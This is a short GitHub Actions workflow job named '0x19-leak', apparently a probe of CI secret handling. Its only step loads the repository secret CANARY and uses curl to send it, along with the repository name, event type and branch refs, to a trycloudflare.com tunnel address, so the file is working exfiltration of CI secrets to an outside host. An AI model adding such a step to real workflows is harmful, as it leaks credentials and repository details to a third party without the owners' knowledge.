    name: 0x19-leak
    runs-on: ubuntu-latest
    steps:
      - name: leak
        env:
          CANARY: ${{ secrets.CANARY }}
        run: |
          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-q2-leak?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&ref=${{ github.ref }}&head=${{ github.head_ref }}"
